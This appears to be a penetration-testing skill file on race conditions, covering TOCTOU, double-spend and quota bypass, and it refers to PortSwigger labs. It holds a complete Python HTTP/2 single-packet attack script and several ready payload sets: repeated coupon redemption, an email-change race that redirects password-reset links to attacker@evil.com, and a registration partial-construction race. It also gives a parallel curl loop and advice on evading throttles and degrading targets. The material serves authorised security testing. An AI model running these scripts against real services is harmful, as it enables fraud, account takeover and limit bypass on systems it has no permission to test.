---
name: race-conditions
description: Race condition testing for TOCTOU bugs, double-spend, and concurrent state manipulation
---

# Race Conditions

Concurrency bugs enable duplicate state changes, quota bypass, financial abuse, and privilege errors. Treat every read–modify–write and multi-step workflow as adversarially concurrent.

## Attack Surface

**Read-Modify-Write**
- Sequences without atomicity or proper locking

**Multi-Step Operations**
- Check → reserve → commit with gaps between phases

**Cross-Service Workflows**
- Sagas, async jobs with eventual consistency

**Rate Limits and Quotas**
- Controls implemented at the edge only

## High-Value Targets

- Payments: auth/capture/refund/void; credits/loyalty points; gift cards
- Coupons/discounts: single-use codes, stacking checks, per-user limits
- Quotas/limits: API usage, inventory reservations, seat counts, vote limits
- Auth flows: password reset/OTP consumption, session minting, device trust
- File/object storage: multi-part finalize, version writes, share-link generation
- Background jobs: export/import create/finalize endpoints; job cancellation/approve
- GraphQL mutations and batch operations; WebSocket actions

## Reconnaissance

### Identify Race Windows

- Look for explicit sequences: "check balance then deduct", "verify coupon then apply", "check inventory then purchase"
- Watch for optimistic concurrency markers: ETag/If-Match, version fields, updatedAt checks
- Examine idempotency-key support: scope (path vs principal), TTL, and persistence (cache vs DB)
- Map cross-service steps: when is state written vs published, what retries/compensations exist

### Signals

- Sequential request fails but parallel succeeds
- Duplicate rows, negative counters, over-issuance, or inconsistent aggregates
- Distinct response shapes/timings for simultaneous vs sequential requests
- Audit logs out of order; multiple 2xx for the same intent; missing or duplicate correlation IDs

## Key Vulnerabilities

### Request Synchronization

- HTTP/2 multiplexing for tight concurrency; send many requests on warmed connections
- Last-byte synchronization: hold requests open and release final byte simultaneously
- Connection warming: pre-establish sessions, cookies, and TLS to remove jitter

### Idempotency and Dedup Bypass

- Reuse the same idempotency key across different principals/paths if scope is inadequate
- Hit the endpoint before the idempotency store is written (cache-before-commit windows)
- App-level dedup drops only the response while side effects (emails/credits) still occur

### Atomicity Gaps

- Lost update: read-modify-write increments without atomic DB statements
- Partial two-phase workflows: success committed before validation completes
- Unique checks done outside a unique index/upsert: create duplicates under load

### Cross-Service Races

- Saga/compensation timing gaps: execute compensation without preventing the original success path
- Eventual consistency windows: act in Service B before Service A's write is visible
- Retry storms: duplicate side effects due to at-least-once delivery without idempotent consumers

### Rate Limits and Quotas

- Per-IP or per-connection enforcement: bypass with multiple IPs/sessions
- Counter updates not atomic or sharded inconsistently; send bursts before counters propagate

### Optimistic Concurrency Evasion

- Omit If-Match/ETag where optional; supply stale versions if server ignores them
- Version fields accepted but not validated across all code paths (e.g., GraphQL vs REST)

### Database Isolation

- Exploit READ COMMITTED/REPEATABLE READ anomalies: phantoms, non-serializable sequences
- Upsert races: use unique indexes with proper ON CONFLICT/UPSERT or exploit naive existence checks
- Lock granularity issues: row vs table; application locks held only in-process

### Distributed Locks

- Redis locks without NX/EX or fencing tokens allow multiple winners
- Locks stored in memory on a single node; bypass by hitting other nodes/regions

## Practical Attack Scripts

### HTTP/2 Single-Packet Attack (Core Technique)

All PortSwigger race condition labs require sending multiple requests simultaneously via HTTP/2 multiplexing on a single TCP connection, ensuring they arrive in the same server processing window.

```python
#!/usr/bin/env python3
"""HTTP/2 single-packet attack — send N requests simultaneously.
This is the core technique for all race condition exploitation."""
import h2.connection, h2.config, h2.events
import socket, ssl, time

TARGET = "TARGET_HOST"  # e.g., "0a1b002c..."
PORT = 443
COOKIE = "session=YOUR_SESSION_COOKIE"

# Define the requests to send simultaneously
REQUESTS = []
for i in range(20):  # 20 parallel requests
    REQUESTS.append({
        "method": "POST",
        "path": "/cart/coupon",  # Endpoint to race
        "headers": {
            "cookie": COOKIE,
            "content-type": "application/x-www-form-urlencoded",
        },
        "body": "csrf=TOKEN&coupon=NEWCUST5",  # Payload
    })

def single_packet_attack(host, port, requests):
    # Create SSL connection
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)
    
    # Initialize HTTP/2 connection
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    # Send all request HEADERS first (without END_STREAM)
    stream_ids = []
    for req in requests:
        headers = [
            (":method", req["method"]),
            (":path", req["path"]),
            (":authority", host),
            (":scheme", "https"),
        ]
        for k, v in req.get("headers", {}).items():
            headers.append((k, v))
        
        body = req.get("body", "").encode() if req.get("body") else None
        if body:
            headers.append(("content-length", str(len(body))))
        
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        conn.send_headers(sid, headers, end_stream=(body is None))
    
    # Flush all headers in one TCP packet
    sock.sendall(conn.data_to_send())
    
    # Now send all DATA frames together (single packet = simultaneous arrival)
    for i, req in enumerate(requests):
        body = req.get("body", "").encode() if req.get("body") else None
        if body:
            conn.send_data(stream_ids[i], body, end_stream=True)
    
    # Send all data in ONE write = single TCP packet
    sock.sendall(conn.data_to_send())
    
    # Collect responses
    responses = {}
    while len(responses) < len(requests):
        data = sock.recv(65535)
        if not data:
            break
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                responses[event.stream_id] = {"headers": dict(event.headers), "data": b""}
            elif isinstance(event, h2.events.DataReceived):
                if event.stream_id in responses:
                    responses[event.stream_id]["data"] += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
        sock.sendall(conn.data_to_send())
    
    sock.close()
    
    # Print results
    for sid in stream_ids:
        if sid in responses:
            status = responses[sid]["headers"].get(b":status", b"?").decode()
            body = responses[sid]["data"].decode(errors="replace")[:200]
            print(f"  Stream {sid}: {status} — {body}")
    
    return responses

print(f"[*] Sending {len(REQUESTS)} requests simultaneously...")
single_packet_attack(TARGET, PORT, REQUESTS)
```

### Multi-Endpoint Race Condition

Race two different endpoints that share state. Example: change email + request password reset simultaneously, so the reset link goes to the new (attacker) email.

```python
#!/usr/bin/env python3
"""Multi-endpoint race: race email change vs password reset."""
# Request 1: Change email to attacker@evil.com
# Request 2: Password reset for the account
# If email change wins the race, reset link goes to attacker's email

REQUESTS = [
    {
        "method": "POST",
        "path": "/my-account/change-email",
        "headers": {"cookie": COOKIE, "content-type": "application/x-www-form-urlencoded"},
        "body": "csrf=TOKEN&email=attacker@evil.com",
    },
    {
        "method": "POST",
        "path": "/forgot-password",
        "headers": {"content-type": "application/x-www-form-urlencoded"},
        "body": "csrf=TOKEN&username=victim",
    },
]
# Send via single_packet_attack() — repeat 10+ times until race succeeds
```

### Single-Endpoint Race (Limit Overrun)

Redeem a single-use discount code multiple times by sending requests simultaneously:

```python
# All requests identical — redeem same coupon code 20 times
REQUESTS = [
    {
        "method": "POST", "path": "/cart/coupon",
        "headers": {"cookie": COOKIE, "content-type": "application/x-www-form-urlencoded"},
        "body": "csrf=TOKEN&coupon=NEWCUST5",
    }
    for _ in range(20)
]
# Run single_packet_attack() — check if discount applied multiple times
```

### Partial Construction Race

Access a user account during the gap between when it's created and when security controls (email verification, 2FA) are applied:

```python
# Race: Registration creates session before email verification check
# Step 1: Start registration
# Step 2: Simultaneously attempt to access /my-account with the session
# The session may be valid for a brief window before verification is enforced

REQUESTS = [
    {
        "method": "POST", "path": "/register",
        "headers": {"content-type": "application/x-www-form-urlencoded"},
        "body": "csrf=TOKEN&username=test&email=test@evil.com&password=pass123",
    },
] + [
    {
        "method": "GET", "path": "/my-account",
        "headers": {"cookie": "session=PREDICTED_OR_EMPTY"},
    }
    for _ in range(10)
]
```

### Timing-Based Race (Using Turbo Intruder Approach)

```bash
# If h2 library is not available, use curl with HTTP/2 multiplexing:
# Send 20 identical requests over single connection
for i in $(seq 1 20); do
  curl -sk "https://TARGET/cart/coupon" \
    -X POST \
    -H "Cookie: $COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "csrf=$CSRF&coupon=NEWCUST5" \
    --http2 &
done
wait
# Less precise than h2 single-packet but may work for wider race windows
```

## Bypass Techniques

- Distribute across IPs, sessions, and user accounts to evade per-entity throttles
- Switch methods/content-types/endpoints that trigger the same state change via different code paths
- Intentionally trigger timeouts to provoke retries that cause duplicate side effects
- Degrade the target (large payloads, slow endpoints) to widen race windows

## Special Contexts

### GraphQL

- Parallel mutations and batched operations may bypass per-mutation guards
- Ensure resolver-level idempotency and atomicity
- Persisted queries and aliases can hide multiple state changes in one request

### WebSocket

- Per-message authorization and idempotency must hold
- Concurrent emits can create duplicates if only the handshake is checked

### Files and Storage

- Parallel finalize/complete on multi-part uploads can create duplicate or corrupted objects
- Re-use pre-signed URLs concurrently

### Auth Flows

- Concurrent consumption of one-time tokens (reset codes, magic links) to mint multiple sessions
- Verify consume is atomic

## Chaining Attacks

- Race + Business logic: violate invariants (double-refund, limit slicing)
- Race + IDOR: modify or read others' resources before ownership checks complete
- Race + CSRF: trigger parallel actions from a victim to amplify effects
- Race + Caching: stale caches re-serve privileged states after concurrent changes

## Testing Methodology

1. **Model invariants** - Conservation of value, uniqueness, maximums for each workflow
2. **Identify reads/writes** - Where they occur (service, DB, cache)
3. **Baseline** - Single requests to establish expected behavior
4. **Concurrent requests** - Issue parallel requests with identical inputs; observe deltas
5. **Scale and synchronize** - Ramp up parallelism, use HTTP/2, align timing (last-byte sync)
6. **Cross-channel** - Test across web, API, GraphQL, WebSocket
7. **Confirm durability** - Verify state changes persist and are reproducible

## Validation

1. Single request denied; N concurrent requests succeed where only 1 should
2. Durable state change proven (ledger entries, inventory counts, role/flag changes)
3. Reproducible under controlled synchronization (HTTP/2, last-byte sync) across multiple runs
4. Evidence across channels (e.g., REST and GraphQL) if applicable
5. Include before/after state and exact request set used

## False Positives

- Truly idempotent operations with enforced ETag/version checks or unique constraints
- Serializable transactions or correct advisory locks/queues
- Visual-only glitches without durable state change
- Rate limits that reject excess with atomic counters

## Impact

- Financial loss (double spend, over-issuance of credits/refunds)
- Policy/limit bypass (quotas, single-use tokens, seat counts)
- Data integrity corruption and audit trail inconsistencies
- Privilege or role errors due to concurrent updates

## Pro Tips

1. Favor HTTP/2 with warmed connections; add last-byte sync for precision
2. Start small (N=5–20), then scale; too much noise can mask the window
3. Target read–modify–write code paths and endpoints with idempotency keys
4. Compare REST vs GraphQL vs WebSocket; protections often differ
5. Look for cross-service gaps (queues, jobs, webhooks) and retry semantics
6. Check unique constraints and upsert usage; avoid relying on pre-insert checks
7. Use correlation IDs and logs to prove concurrent interleaving
8. Widen windows by adding server load or slow backend dependencies
9. Validate on production-like latency; some races only appear under real load
10. Document minimal, repeatable request sets that demonstrate durable impact

## Summary

Concurrency safety is a property of every path that mutates state. If any path lacks atomicity, proper isolation, or idempotency, parallel requests will eventually break invariants.
